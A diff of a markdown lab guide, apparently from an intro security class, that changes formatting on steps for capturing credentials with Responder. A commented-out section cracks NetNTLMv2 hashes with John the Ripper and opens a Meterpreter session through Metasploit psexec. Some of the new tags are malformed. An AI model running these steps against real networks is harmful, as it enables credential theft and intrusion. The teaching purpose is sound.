@@ -16,15 +16,15 @@ Alternatively, you can click on the **Kali** icon in the taskbar.
 
 Next, let’s become root:
 
-```sudo su -```
+<pre>sudo su -</pre>
 
 Before we start, we need to remove the existing **Responder** database. Do so by running the following:
 
-```rm /usr/share/responder/Responder.db```
+<pre>rm /usr/share/responder/Responder.db</pre>
 
 Now let’s start **Responder**:
 
-```responder -I eth0```
+<pre>responder -I eth0</pre>
 
 You should see this:
 
@@ -42,6 +42,9 @@ After a few moments, you should see some captured data showing up.  Please note 
 
 ![](attachments/captureddata.png)
 
+***
+[Back to Navigation Menu](/IntroClassFiles/navigation.md)
+
 <!--
 
 THIS SECTION IS BEING REMOVED FOR THE TIME BEING PER JOHN
@@ -50,11 +53,11 @@ Next we need to kill Responder with `Ctrl + c`.  This will return the command pr
 
 Now, we need to change to the logs directory.
 
-```cd /opt/Responder/logs```
+</pre>cd /opt/Responder/logs</pre>
 
 Once there, we will need to start John The Ripper"
 
-```/opt/JohnTheRipper/run/john --format=netntlmv2 ./HTTP-NTLMv2-172.26.16.1.txt```
+</pre>/opt/JohnTheRipper/run/john --format=netntlmv2 ./HTTP-NTLMv2-172.26.16.1.txt</pre>
 Remember!  Your IP will be different!!!!
 
 
@@ -86,7 +89,7 @@ Next, let’s open a new Kali instance. The easiest way to do this is to click t
 
 Now we are going to start up and launch Metasploit against the Windows system to get a Meterpreter session.
 
-```
+</pre>
 adhd@DESKTOP-I1T2G01:/mnt/c/Users/adhd$ <b>sudo su -</b>
 [sudo] password for adhd:
 root@DESKTOP-I1T2G01:~#
@@ -116,7 +119,7 @@ msf5 exploit(windows/smb/psexec) ><b> exploit</b>
 [*] Meterpreter session 1 opened (172.18.121.248:4444 -> 172.18.112.1:52806) at 2022-10-18 12:39:56 -0600
 
 meterpreter >
-```
+</pre>
 Now, you can see just how bad LLMNR is!!!!
 */
 -->
